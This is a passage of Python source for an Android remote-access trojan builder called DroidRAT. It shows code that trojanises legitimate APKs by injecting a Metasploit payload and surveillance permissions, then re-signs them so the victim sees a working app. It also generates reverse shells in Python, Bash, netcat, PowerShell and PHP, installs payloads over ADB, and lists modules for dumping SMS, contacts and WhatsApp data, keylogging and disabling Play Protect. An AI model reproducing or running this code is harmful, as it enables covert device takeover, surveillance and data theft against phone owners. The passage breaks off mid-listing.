        subprocess.run(["apktool", "d", "-f", "-o", payload_dir, f"{BUILDS_DIR}/temp_payload.apk"],
                      capture_output=True, text=True, timeout=30)
        print(colorize("    [OK] Payload generated and decompiled.", "green"))
    except Exception as e:
        print(colorize(f"    [FAIL] {e}", "red"))
        input("Press Enter to continue...")
        return
    
    print(colorize(f"\n[*] Step 3: Locating main activity...", "yellow"))
    try:
        # Find the launcher activity
        manifest_path = f"{work_dir}/AndroidManifest.xml"
        with open(manifest_path, 'r') as f:
            manifest = f.read()
        
        # Extract launcher activity
        import re
        activity_match = re.search(r'android:name="([^"]+)"[^>]*>\\s*<intent-filter>', manifest, re.DOTALL)
        if activity_match:
            launcher = activity_match.group(1)
        else:
            # Try simpler regex
            activities = re.findall(r'<activity[^>]*android:name="([^"]+)"', manifest)
            launcher = activities[0] if activities else None
        
        if launcher:
            print(colorize(f"    Main Activity: {launcher}", "green"))
        else:
            launcher = "com.example.MainActivity"
            print(colorize(f"    Using default: {launcher}", "yellow"))
    except Exception as e:
        print(colorize(f"    [FAIL] {e}", "red"))
        launcher = "com.example.MainActivity"
    
    print(colorize(f"\n[*] Step 4: Injecting payload into app...", "yellow"))
    try:
        # Copy payload smali files to original app
        payload_smali = f"{payload_dir}/smali/com/metasploit/stage"
        if os.path.exists(payload_smali):
            # Find the correct smali directory in original app
            target_smali_base = f"{work_dir}/smali"
            target_payload = f"{target_smali_base}/com/metasploit/stage"
            Path(target_payload).mkdir(parents=True, exist_ok=True)
            
            for f in os.listdir(payload_smali):
                shutil.copy2(os.path.join(payload_smali, f), target_payload)
            
            print(colorize("    [OK] Payload smali files copied.", "green"))
        else:
            print(colorize("    [FAIL] Payload smali not found.", "red"))
            input("Press Enter to continue...")
            return
        
        # Inject into launcher activity's onCreate
        launcher_path = launcher.replace('.', '/')
        # Try multiple possible locations
        smali_file = None
        for smali_dir in ['smali', 'smali_classes2', 'smali_classes3']:
            candidate = f"{work_dir}/{smali_dir}/{launcher_path}.smali"
            if os.path.exists(candidate):
                smali_file = candidate
                break
        
        if smali_file:
            with open(smali_file, 'r') as f:
                content = f.read()
            
            # Inject after invoke-super {p0}, ...->onCreate
            hook = 'invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V'
            
            if 'onCreate' in content:
                content = content.replace(
                    'invoke-super {p0}, ',
                    f'{hook}\\n\\n    invoke-super {{p0}}, '
                )
                with open(smali_file, 'w') as f:
                    f.write(content)
                print(colorize(f"    [OK] Payload injected into {os.path.basename(smali_file)}", "green"))
            else:
                print(colorize("    [WARN] Could not find onCreate method.", "yellow"))
        else:
            print(colorize(f"    [WARN] Could not find {launcher_path}.smali", "yellow"))
        
        # Add required permissions
        print(colorize(f"\n[*] Step 5: Adding permissions...", "yellow"))
        needed_perms = [
            'android.permission.INTERNET',
            'android.permission.ACCESS_NETWORK_STATE',
            'android.permission.READ_SMS',
            'android.permission.READ_CONTACTS',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.CAMERA',
            'android.permission.RECORD_AUDIO',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.WRITE_EXTERNAL_STORAGE'
        ]
        
        for perm in needed_perms:
            if perm not in manifest:
                # Add to manifest
                manifest = manifest.replace(
                    '</manifest>',
                    f'    <uses-permission android:name="{perm}"/>\n</manifest>'
                )
        
        with open(manifest_path, 'w') as f:
            f.write(manifest)
        print(colorize("    [OK] Permissions added.", "green"))
        
        print(colorize(f"\n[*] Step 6: Rebuilding APK...", "yellow"))
        subprocess.run(["apktool", "b", "-o", output, work_dir], 
                      capture_output=True, text=True, timeout=60)
        
        if os.path.exists(output):
            print(colorize("    [OK] APK rebuilt.", "green"))
            
            # Sign the APK
            print(colorize(f"\n[*] Step 7: Signing APK...", "yellow"))
            try:
                # Generate keystore
                keystore = f"{BUILDS_DIR}/debug.keystore"
                if not os.path.exists(keystore):
                    subprocess.run([
                        "keytool", "-genkey", "-v", "-keystore", keystore,
                        "-alias", "android", "-keyalg", "RSA", "-keysize", "2048",
                        "-validity", "10000",
                        "-storepass", "android", "-keypass", "android",
                        "-dname", "CN=Android Debug, OU=Debug, O=Android, L=Unknown, ST=Unknown, C=US"
                    ], capture_output=True, timeout=10)
                
                if shutil.which("apksigner"):
                    subprocess.run(["apksigner", "sign", "--ks", keystore, 
                                  "--ks-pass", "pass:android", output], 
                                 capture_output=True, timeout=30)
                elif shutil.which("jarsigner"):
                    subprocess.run(["jarsigner", "-verbose", "-sigalg", "SHA1withRSA",
                                  "-digestalg", "SHA1", "-keystore", keystore,
                                  "-storepass", "android", output, "android"],
                                 capture_output=True, timeout=30)
                
                print(colorize("    [OK] APK signed.", "green"))
            except Exception as e:
                print(colorize(f"    [WARN] Signing failed: {e}", "yellow"))
                print(colorize("    You can sign manually with: jarsigner ...", "dim"))
            
            size = os.path.getsize(output)
            md5 = hashlib.md5(open(output,'rb').read()).hexdigest()
            print(colorize(f"\n[+] FINAL APK: {output}", "green"))
            print(colorize(f"    Size: {size/1024:.1f} KB", "green"))
            print(colorize(f"    MD5: {md5}", "dim"))
            print(colorize(f"\n[!] This APK has the payload INSIDE the original app!", "yellow"))
            print(colorize(f"    Victim sees the original app - it works normally.", "yellow"))
            print(colorize(f"    But payload connects back to {lhost}:{lport} in background.", "yellow"))
    except Exception as e:
        print(colorize(f"\n[!] Error during injection: {e}", "red"))
    
    # Cleanup
    for d in [work_dir, payload_dir, f"{BUILDS_DIR}/temp_payload.apk"]:
        try:
            if os.path.isdir(d):
                shutil.rmtree(d)
            elif os.path.isfile(d):
                os.remove(d)
        except:
            pass
    
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


def build_termux_apk(lhost, lport):
    """Create an APK that uses Termux + Python"""
    print(colorize("\n[*] Method 4: Termux + Python Bundle", "cyan"))
    print(colorize("[*] Creates APK that installs Python and connects back\n", "yellow"))
    
    # Create a shell script that will be bundled
    shell_script = f'''#!/data/data/com.termux/files/usr/bin/bash
# DroidRAT - Auto-connect payload for Termux
pkg install -y python 2>/dev/null
python3 -c "
import socket,subprocess,os,pty,threading,time
def connect():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('{lhost}',{lport}))
            s.send(b'[+] Termux DroidRAT\\n')
            while True:
                d=s.recv(4096)
                if not d: break
                c=d.decode().strip()
                if c=='EXIT': break
                r=subprocess.getoutput(c[4:] if c.startswith('CMD:') else c)
                s.send(r.encode() if r else b'Done\\n')
            s.close()
        except:
            time.sleep(5)
connect()
" &
'''
    
    with open(f"{BUILDS_DIR}/termux_payload.sh", "w") as f:
        f.write(shell_script)
    
    print(colorize(f"\n[+] Termux script created: {BUILDS_DIR}/termux_payload.sh", "green"))
    print(colorize(f"\n[*] To use this method:", "yellow"))
    print(colorize(f"    1. Victim must have Termux installed from F-Droid", "yellow"))
    print(colorize(f"    2. Create a simple APK wrapper using APKTool:", "yellow"))
    print(colorize(f"       - Create an Android app that runs this script", "yellow"))
    print(colorize(f"       - Or use termux-boot to run on device startup", "yellow"))
    print(colorize(f"\n[*] Alternative: Create APK with Termux API", "dim"))
    print(colorize(f"    Use 'termux-notification' to hide in background", "dim"))
    
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


# Add this to the Build Dropper menu in main()

# ============================================================
# RUN PAYLOAD (USB Injection)
# ============================================================

def run_payload():
    """Inject payload via USB"""
    print(colorize("\n=== Run Payload (USB Injection) ===", "cyan"))
    
    adb = check_adb()
    if not adb:
        print(colorize("[!] ADB not found. Install Android platform-tools.", "red"))
        print(colorize("    sudo apt install adb", "yellow"))
        input("Press Enter to continue...")
        return
    
    # Get connected devices
    try:
        result = subprocess.run([adb, "devices"], capture_output=True, text=True, timeout=5)
        devices = [line.split('\t')[0] for line in result.stdout.strip().split('\n')[1:] if line.strip() and '\tdevice' in line]
    except:
        devices = []
    
    if not devices:
        print(colorize("[!] No Android devices connected via USB debugging.", "red"))
        print(colorize("    Enable Developer Options and USB Debugging on the target device.", "yellow"))
        input("Press Enter to continue...")
        return
    
    print(f"\n{colorize('[+] Found devices:', 'green')}")
    for i, dev in enumerate(devices):
        try:
            model = subprocess.run([adb, "-s", dev, "shell", "getprop", "ro.product.model"], 
                                 capture_output=True, text=True, timeout=3).stdout.strip()
        except:
            model = "Unknown"
        try:
            android_ver = subprocess.run([adb, "-s", dev, "shell", "getprop", "ro.build.version.release"], 
                                       capture_output=True, text=True, timeout=3).stdout.strip()
        except:
            android_ver = "?"
        print(f"  [{i+1}] {colorize(dev, 'cyan')} - {model} (Android {android_ver})")
    
    try:
        idx = int(input(f"\n{colorize('Select device number: ', 'cyan')}")) - 1
        if idx < 0 or idx >= len(devices):
            raise ValueError
        target_device = devices[idx]
    except:
        print(colorize("[!] Invalid selection.", "red"))
        time.sleep(1)
        return
    
    lhost = config.get("lhost", "127.0.0.1")
    lport = config.get("lport", 4444)
    
    print(f"\n{colorize('Select payload type:', 'yellow')}")
    print(f"  {colorize('[1]', 'yellow')} Reverse Shell (Python)")
    print(f"  {colorize('[2]', 'yellow')} Reverse Shell (Netcat)")
    print(f"  {colorize('[3]', 'yellow')} Meterpreter (if msfvenom installed)")
    print(f"  {colorize('[4]', 'yellow')} Install APK from builds")
    print(f"  {colorize('[5]', 'yellow')} Custom ADB Command")
    
    ptype = input(f"\n{colorize('Choice: ', 'cyan')}").strip()
    
    if ptype == '1':
        # Python reverse shell - fix: use chr() to avoid backslash in f-string
        dq = chr(34)  # double quote
        sq = chr(39)  # single quote
        py_code = f"import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({dq}{lhost}{dq},{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn({dq}/bin/sh{dq})"
        b64 = base64.b64encode(py_code.encode()).decode()
        cmd = f"shell python3 -c \"import base64; exec(base64.b64decode('{b64}').decode())\""
        
    elif ptype == '2':
        cmd = f"shell nc {lhost} {lport} -e /bin/sh"
        
    elif ptype == '3':
        if check_msfvenom():
            apk_out = f"{BUILDS_DIR}/meterpreter_usb.apk"
            print(colorize("[*] Generating meterpreter payload...", "yellow"))
            result = subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", 
                          f"LHOST={lhost}", f"LPORT={lport}", "-o", apk_out], 
                         capture_output=True, text=True, timeout=60)
            if os.path.exists(apk_out):
                print(colorize(f"[+] Payload generated. Installing via ADB...", "green"))
                install_result = subprocess.run([adb, "-s", target_device, "install", apk_out], 
                                              capture_output=True, text=True, timeout=30)
                if "Success" in install_result.stdout:
                    print(colorize("[+] APK installed successfully on device.", "green"))
                else:
                    print(colorize(f"[!] Install result: {install_result.stdout}", "yellow"))
                print(colorize(f"[*] Start listener with: msfconsole -r {BUILDS_DIR}/handler.rc", "yellow"))
                input("\nPress Enter to continue...")
                return
        else:
            print(colorize("[!] msfvenom not found.", "red"))
            time.sleep(1)
            return
    elif ptype == '4':
        # Install existing APK
        apks = sorted(glob.glob(f"{BUILDS_DIR}/*.apk"))
        if not apks:
            print(colorize("[!] No APK files found in builds directory.", "red"))
            input("Press Enter to continue...")
            return
        print(f"\n{colorize('Available APKs:', 'yellow')}")
        for i, apk in enumerate(apks):
            size = os.path.getsize(apk)
            print(f"  [{i+1}] {os.path.basename(apk)} ({size/1024:.1f} KB)")
        try:
            apk_idx = int(input(f"\n{colorize('Select APK: ', 'cyan')}")) - 1
            apk_path = apks[apk_idx]
        except:
            print(colorize("[!] Invalid selection.", "red"))
            time.sleep(1)
            return
        print(colorize(f"[*] Installing {os.path.basename(apk_path)}...", "yellow"))
        result = subprocess.run([adb, "-s", target_device, "install", apk_path], 
                              capture_output=True, text=True, timeout=30)
        print(result.stdout)
        input("\nPress Enter to continue...")
        return
    else:
        cmd = input("Enter custom ADB command (without 'adb shell'): ").strip()
        if not cmd.startswith("shell "):
            cmd = f"shell {cmd}"
    
    print(colorize(f"\n[*] Executing: adb -s {target_device} {cmd[:80]}...", "yellow"))
    
    try:
        result = subprocess.run([adb, "-s", target_device] + cmd.split(), 
                              capture_output=True, text=True, timeout=10)
        if result.stdout:
            print(colorize(f"[+] Output:\n{result.stdout[:500]}", "green"))
        if result.stderr:
            print(colorize(f"[!] Errors:\n{result.stderr[:500]}", "red"))
        print(colorize(f"[+] Return code: {result.returncode}", "green"))
    except subprocess.TimeoutExpired:
        print(colorize("[!] Command timed out (payload running in background?).", "yellow"))
    except Exception as e:
        print(colorize(f"[!] Error: {e}", "red"))
    
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


# ============================================================
# LIST PAYLOADS
# ============================================================

def list_payloads():
    """List all available payloads"""
    print(colorize("\n=== Available Payloads ===", "cyan"))
    
    builtin = [
        ("py_reverse_shell", "Python reverse TCP shell"),
        ("py_bind_shell", "Python bind shell on port"),
        ("bash_reverse", "Bash reverse shell"),
        ("nc_reverse", "Netcat reverse shell"),
        ("perl_reverse", "Perl reverse shell"),
        ("php_reverse", "PHP reverse shell"),
        ("ruby_reverse", "Ruby reverse shell"),
        ("lua_reverse", "Lua reverse shell"),
        ("powershell_reverse", "PowerShell reverse shell (Windows)"),
        ("java_reverse", "Java reverse shell"),
        ("meterpreter_android", "Android Meterpreter payload"),
        ("meterpreter_windows", "Windows Meterpreter payload"),
        ("meterpreter_linux", "Linux Meterpreter payload")
    ]
    
    print(f"\n{colorize('Built-in Payloads:', 'yellow')}")
    print(f"  {'='*50}")
    for name, desc in builtin:
        print(f"  {colorize(name, 'cyan'):<25} {desc}")
    
    if os.path.exists(PAYLOADS_DIR):
        files = [f for f in os.listdir(PAYLOADS_DIR) if not f.startswith('.') and f != 'README.txt']
        if files:
            print(f"\n{colorize('Custom Payloads:', 'yellow')}")
            print(f"  {'='*50}")
            for f in files:
                fpath = os.path.join(PAYLOADS_DIR, f)
                size = os.path.getsize(fpath)
                print(f"  {colorize(f, 'cyan'):<25} {size/1024:.1f} KB")
    
    print(f"\n{colorize('[C]', 'yellow')} Create Custom Payload")
    print(f"{colorize('[B]', 'red')} Back to Main Menu")
    
    choice = input(f"\n{colorize('Select option: ', 'cyan')}").strip().lower()
    
    if choice == 'c':
        create_payload()
    elif choice == 'b':
        return


def create_payload():
    """Create a custom payload"""
    print(colorize("\n=== Create Custom Payload ===", "cyan"))
    
    lhost = config.get("lhost", "127.0.0.1")
    lport = config.get("lport", 4444)
    
    print(f"\n{colorize('Payload Types:', 'yellow')}")
    print(f"  {colorize('[1]', 'yellow')} Python Reverse Shell")
    print(f"  {colorize('[2]', 'yellow')} Bash Reverse Shell")
    print(f"  {colorize('[3]', 'yellow')} PowerShell Reverse Shell")
    print(f"  {colorize('[4]', 'yellow')} PHP Reverse Shell")
    print(f"  {colorize('[5]', 'yellow')} Custom")
    
    choice = input(f"\n{colorize('Choice: ', 'cyan')}").strip()
    
    payload_name = input("Payload name (no spaces): ").strip() or f"payload_{generate_id()}"
    
    if choice == '1':
        payload = f'''import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
'''
    elif choice == '2':
        payload = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    elif choice == '3':
        payload = f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
    elif choice == '4':
        payload = f"<?php exec(\\\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\\\"); ?>"
    elif choice == '5':
        print(f"\nEnter custom payload (end with 'EOF' on a new line):")
        lines = []
        while True:
            line = input()
            if line.strip() == 'EOF':
                break
            lines.append(line)
        payload = '\n'.join(lines)
    else:
        print(colorize("[!] Invalid choice.", "red"))
        time.sleep(1)
        return
    
    ext_map = {'1': '.py', '2': '.sh', '3': '.ps1', '4': '.php', '5': '.txt'}
    ext = ext_map.get(choice, '.txt')
    fpath = os.path.join(PAYLOADS_DIR, f"{payload_name}{ext}")
    
    with open(fpath, 'w') as f:
        f.write(payload)
    
    print(colorize(f"\n[+] Payload saved: {fpath}", "green"))
    print(colorize(f"    Size: {len(payload)} bytes", "green"))
    
    b64 = base64.b64encode(payload.encode()).decode()
    print(colorize(f"\n[+] Base64 Encoded:", "green"))
    print(b64)
    
    if choice == '1':
        # Use chr(39) for single quote to avoid f-string issues
        sq = chr(39)
        oneliner = f"python3 -c \"import base64; exec(base64.b64decode('{b64}').decode())\""
        print(colorize(f"\n[+] One-liner:", "green"))
        print(oneliner)
    
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


# ============================================================
# LIST MODULES
# ============================================================

def list_modules():
    """List all available modules"""
    print(colorize("\n=== Available Modules ===", "cyan"))
    
    modules = {
        "post/android/reverse_shell": "Python reverse shell handler",
        "post/android/screen_capture": "Capture Android screen",
        "post/android/camera_capture": "Capture photo from camera",
        "post/android/mic_record": "Record audio from microphone",
        "post/android/sms_dump": "Dump SMS messages",
        "post/android/contacts_dump": "Dump contacts",
        "post/android/gps_track": "Get GPS location",
        "post/android/keylogger": "Keylogger module",
        "post/android/file_browser": "Browse files on device",
        "post/android/persist": "Install persistence mechanism",
        "post/android/wifi_dump": "Dump saved WiFi passwords",
        "post/android/browser_data": "Extract browser data",
        "post/android/whatsapp_extract": "Extract WhatsApp data",
        "post/android/telegram_extract": "Extract Telegram data",
        "post/android/bypass_lock": "Bypass lock screen",
        "post/android/disable_play_protect": "Disable Google Play Protect",
        "post/android/hide_icon": "Hide app icon from launcher",
        "post/android/background_service": "Run as background service"
    }
    
    print(f"\n{'='*60}")
    print(f"{'Module Name':<35} {'Description':<25}")
    print(f"{'='*60}")
    
    for name, desc in modules.items():
        print(f"  {colorize(name, 'cyan'):<35} {desc}")
    
    if os.path.exists(MODULES_DIR):
        files = sorted([f for f in os.listdir(MODULES_DIR) if f.endswith('.py')])
        if files:
            print(f"\n{colorize('Custom Modules:', 'yellow')}")
            for f in files:
                print(f"  {colorize(f, 'cyan')}")
    
    print(f"\n{colorize('[C]', 'yellow')} Create Custom Module")
    print(f"{colorize('[R]', 'yellow')} Run Module")
    print(f"{colorize('[B]', 'red')} Back to Main Menu")
    
    choice = input(f"\n{colorize('Select option: ', 'cyan')}").strip().lower()
    
    if choice == 'c':
        create_module()
    elif choice == 'r':
        run_module_interactive()
    elif choice == 'b':
        return


def create_module():
    """Create a custom module"""
    print(colorize("\n=== Create Custom Module ===", "cyan"))
    
    name = input("Module name: ").strip()
    if not name:
        return
    
    module_template = f'''#!/usr/bin/env python3
"""
Module: {name}
DroidRAT Security Testing Module
"""

import os, sys, json, time, socket, subprocess
from datetime import datetime

class Module:
    def __init__(self, session=None):
        self.name = "{name}"
        self.session = session
        self.author = "Nomi CYBER-X Team"
        self.description = "Description of {name}"
        self.platforms = ["android", "linux", "windows"]
        self.options = {{
            "LHOST": {{"value": "", "required": True, "desc": "Local host IP"}},
            "LPORT": {{"value": "4444", "required": True, "desc": "Local port"}}
        }}
    
    def run(self):
        print(f"[*] Running module: {{self.name}}")
        if self.session:
            print(f"[*] Targeting session: {{self.session.session_id}}")
        return True
    
    def info(self):
        print(f"Name: {{self.name}}")
        print(f"Author: {{self.author}}")
        print(f"Description: {{self.description}}")
        print(f"Platforms: {{', '.join(self.platforms)}}")

if __name__ == "__main__":
    m = Module()
    m.info()
    m.run()
'''
    
    fpath = os.path.join(MODULES_DIR, f"{name}.py")
    with open(fpath, 'w') as f:
        f.write(module_template)
    
    print(colorize(f"[+] Module created: {fpath}", "green"))
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


def run_module_interactive():
    """Interactive module runner"""
    print(colorize("\n=== Run Module ===", "cyan"))
    
    if not sessions:
        print(colorize("[!] No active sessions.", "red"))
        time.sleep(1)
        return
    
    print(f"\n{colorize('Active Sessions:', 'yellow')}")
    for sid, session in sessions.items():
        status = "\u25c9" if session.alive else "\u25cb"
        print(f"  [{status}] {sid} - {session.device_info}")
    
    sid = input(f"\n{colorize('Enter session ID: ', 'cyan')}").strip()
    if sid not in sessions:
        print(colorize("[!] Session not found.", "red"))
        time.sleep(1)
        return
    
    module_name = input("Enter module name: ").strip()
    module_path = os.path.join(MODULES_DIR, f"{module_name}.py")
    
    if os.path.exists(module_path):
        print(colorize(f"[*] Running module {module_name} on session {sid}...", "yellow"))
        try:
            sys.path.insert(0, MODULES_DIR)
            spec = importlib.util.spec_from_file_location(module_name, module_path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            if hasattr(mod, 'Module'):
                m = mod.Module(sessions[sid])
                m.run()
        except Exception as e:
            print(colorize(f"[!] Module error: {e}", "red"))
    else:
        print(colorize(f"[!] Module not found: {module_path}", "red"))
    
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


# ============================================================
# LIST EXPLOITS
# ============================================================

def list_exploits():
    """List available exploits"""
    print(colorize("\n=== Available Exploits ===", "cyan"))
    
    exploits = {
        "exploit/android/adb_backdoor": "ADB debugging enabled backdoor access",
        "exploit/android/stagefright": "Stagefright MSM media server exploit",
        "exploit/android/dirtycow": "Dirty COW privilege escalation (CVE-2016-5195)",
        "exploit/android/blueborne": "Bluetooth RCE (CVE-2017-0781)",
        "exploit/android/broadpwn": "Broadcom WiFi RCE (CVE-2017-9417)",
        "exploit/android/framebuffer": "FrameBuffer kernel exploit",
        "exploit/android/strangelove": "Qualcomm KGSL GPU exploit",
        "exploit/android/usb_debug": "USB debugging exploitation vector",
        "exploit/android/settings_bypass": "Settings protection bypass",
        "exploit/android/play_protect_bypass": "Google Play Protect bypass",
        "exploit/android/root_bypass": "Root detection bypass",
        "exploit/android/webview_rce": "WebView RCE via XSS",
        "exploit/android/intent_injection": "Malicious intent injection",
        "exploit/android/wifi_rce": "WiFi RCE on vulnerable firmware",
        "exploit/linux/kernel_privesc": "Linux kernel privilege escalation"
    }
    
    print(f"\n{'='*60}")
    print(f"{'Exploit Name':<40} {'Description':<20}")
    print(f"{'='*60}")
    
    for name, desc in exploits.items():
        print(f"  {colorize(name, 'cyan'):<40} {desc}")
    
    if os.path.exists(EXPLOITS_DIR):
        files = sorted([f for f in os.listdir(EXPLOITS_DIR) if f.endswith('.py')])
        if files:
            print(f"\n{colorize('Custom Exploits:', 'yellow')}")
            for f in files:
                print(f"  {colorize(f, 'cyan')}")
    
    print(f"\n{colorize('[R]', 'yellow')} Run Exploit")
    print(f"{colorize('[B]', 'red')} Back to Main Menu")
    
    choice = input(f"\n{colorize('Select option: ', 'cyan')}").strip().lower()
    
    if choice == 'r':
        run_exploit_interactive()
    elif choice == 'b':
        return


def run_exploit_interactive():
    """Interactive exploit runner"""
    print(colorize("\n=== Run Exploit ===", "cyan"))
    
    exploit_name = input("Enter exploit name: ").strip()
    if not exploit_name:
        return
    
    print(colorize(f"\n[*] Loading exploit: {exploit_name}", "yellow"))
    
    if exploit_name == "exploit/android/adb_backdoor":
        exploit_adb_backdoor()
    elif exploit_name == "exploit/android/dirtycow":
        exploit_dirtycow()
    elif exploit_name == "exploit/android/blueborne":
        exploit_blueborne()
    else:
        exploit_path = os.path.join(EXPLOITS_DIR, f"{exploit_name.split('/')[-1]}.py")
        if os.path.exists(exploit_path):
            print(colorize(f"[+] Executing {exploit_path}...", "green"))
            try:
                result = subprocess.run(["python3", exploit_path], capture_output=True, text=True, timeout=30)
                print(result.stdout)
                if result.stderr:
                    print(colorize(f"[!] {result.stderr}", "red"))
            except subprocess.TimeoutExpired:
                print(colorize("[!] Exploit timed out.", "red"))
            except Exception as e:
                print(colorize(f"[!] Error: {e}", "red"))
        else:
            print(colorize(f"[!] Exploit not found.", "red"))
    
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


def exploit_adb_backdoor():
    """Exploit ADB debugging backdoor vector"""
    print(colorize("\n[*] ADB Backdoor Exploit", "cyan"))
    print(colorize("[*] Vector: USB Debugging enabled on target device", "yellow"))
    
    adb = check_adb()
    if not adb:
        print(colorize("[!] ADB not found.", "red"))
        return
    
    result = subprocess.run([adb, "devices"], capture_output=True, text=True, timeout=5)
    devices = [line.split('\t')[0] for line in result.stdout.strip().split('\n')[1:] if line.strip() and '\tdevice' in line]
    
    if not devices:
        print(colorize("[!] No devices in ADB mode.", "red"))
        return
    
    target = devices[0]
    info = subprocess.run([adb, "-s", target, "shell", "getprop", "ro.build.version.release"], 
                        capture_output=True, text=True, timeout=5).stdout.strip()
    model = subprocess.run([adb, "-s", target, "shell", "getprop", "ro.product.model"], 
                         capture_output=True, text=True, timeout=5).stdout.strip()
    
    print(colorize(f"\n[+] Target acquired: {target}", "green"))
    print(colorize(f"    Model: {model}", "green"))
    print(colorize(f"    Android: {info}", "green"))
    print(colorize(f"\n[+] ADB shell access GRANTED", "green"))
    print(colorize(f"    Run: adb -s {target} shell", "green"))
    print(colorize(f"\n[+] Recommended post-exploitation:", "yellow"))
    print(colorize(f"    1. Extract APKs: adb pull /data/app/", "dim"))
    print(colorize(f"    2. Dump SMS: adb shell content query --uri content://sms/inbox", "dim"))
    print(colorize(f"    3. Install backdoor: adb install payload.apk", "dim"))


def exploit_dirtycow():
    """Dirty COW (CVE-2016-5195)"""
    print(colorize("\n[*] Dirty COW Exploit (CVE-2016-5195)", "cyan"))
    print(colorize("[*] Kernel privilege escalation via race condition", "yellow"))
    print(colorize("[*] Requires: kernel < 4.8.3, device with GCC/NDK", "yellow"))
    print(colorize("\n[+] For full exploitation:", "green"))
    print(colorize("    git clone https://github.com/timwr/CVE-2016-5195.git", "dim"))
    print(colorize("    arm-linux-androideabi-gcc -pie -o dirtycow dirtycow.c", "dim"))
    print(colorize("    adb push dirtycow /data/local/tmp/", "dim"))
    print(colorize("    adb shell chmod 755 /data/local/tmp/dirtycow", "dim"))
    print(colorize("    adb shell /data/local/tmp/dirtycow", "dim"))


def exploit_blueborne():
    """BlueBorne (CVE-2017-0781)"""
    print(colorize("\n[*] BlueBorne Exploit (CVE-2017-0781)", "cyan"))
    print(colorize("[*] Bluetooth RCE via BNEP service", "yellow"))
    print(colorize("[*] Affects: Android 4.4 - 9.0", "yellow"))
    print(colorize("\n[+] Requirements:", "yellow"))
    print(colorize("    - Bluetooth enabled on target", "dim"))
    print(colorize("    - Target MAC address known", "dim"))
    print(colorize("    - Python with pybluez: pip install pybluez", "dim"))
    print(colorize("\n[+] For PoC:", "green"))
    print(colorize("    git clone https://github.com/ArmisSecurity/blueborne", "dim"))


# ============================================================
# BLUET-DUCKY
# ============================================================

def bluet_ducky():
    """Bluetooth HID device attack"""
    print(colorize("\n=== Bluet-Ducky (Bluetooth HID Attack) ===", "cyan"))
    print(colorize("[*] Bluetooth Human Interface Device attack framework\n", "yellow"))
    
    print(f"  {colorize('[1]', 'yellow')} Bluetooth Keyboard Spoofing")
    print(f"  {colorize('[2]', 'yellow')} HID Payload Injection (Ducky Script)")
    print(f"  {colorize('[3]', 'yellow')} Android TV Remote Control")
    print(f"  {colorize('[4]', 'yellow')} Bluetooth Mouse Emulation")
    print(f"  {colorize('[5]', 'yellow')} Custom HID Payload")
    print(f"  {colorize('[B]', 'red')} Back to Main Menu")
    
    choice = input(f"\n{colorize('Select attack: ', 'cyan')}").strip()
    
    if choice == '1':
        bluetooth_keyboard_spoof()
    elif choice == '2':
        hid_payload_injection()
    elif choice == '3':
        android_tv_remote()
    elif choice == '4':
        bluetooth_mouse_emulation()
    elif choice == '5':
        custom_hid_payload()
    elif choice.lower() == 'b':
        return


def bluetooth_keyboard_spoof():
    """Spoof a Bluetooth keyboard"""
    print(colorize("\n[*] Bluetooth Keyboard Spoofing", "cyan"))
    
    has_pybluez = False
    try:
        import bluetooth
        has_pybluez = True
    except:
        pass
    
    if has_pybluez:
        print(colorize("[*] Scanning for Bluetooth devices (8 sec)...", "yellow"))
        try:
            import bluetooth
            devices = bluetooth.discover_devices(duration=8, lookup_names=True)
            if devices:
                print(colorize(f"[+] Found {len(devices)} devices:", "green"))
                for addr, name in devices:
                    print(f"    {colorize(addr, 'cyan')} - {name}")
            else:
                print(colorize("[!] No Bluetooth devices found.", "red"))
        except:
            print(colorize("[!] Bluetooth scan failed.", "red"))
    else:
        print(colorize("[!] PyBluez not installed.", "yellow"))
        print(colorize("    pip install pybluez (Linux) or use system tools", "yellow"))
        print(colorize("\n[*] Using system Bluetooth tools...", "yellow"))
        if platform.system() == "Linux":
            try:
                subprocess.run(["hciconfig"], capture_output=True, timeout=5)
                print(colorize("[*] Bluetooth hardware detected.", "green"))
                print(colorize("    bluetoothctl scan on", "dim"))
                print(colorize("    bluetoothctl devices", "dim"))
            except:
                print(colorize("[!] No Bluetooth hardware.", "red"))
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


def hid_payload_injection():
    """HID payload injection via Ducky Script"""
    print(colorize("\n[*] HID Payload Injection (Ducky Script)", "cyan"))
    
    print(f"\n{colorize('Built-in Payloads:', 'yellow')}")
    payloads = {
        "1": ("Reverse Shell", "Opens reverse shell connection"),
        "2": ("Credential Harvester", "Harvests saved credentials"),
        "3": ("WiFi Password Dump", "Dumps saved WiFi passwords"),
        "4": ("Keylogger Install", "Installs a keylogger"),
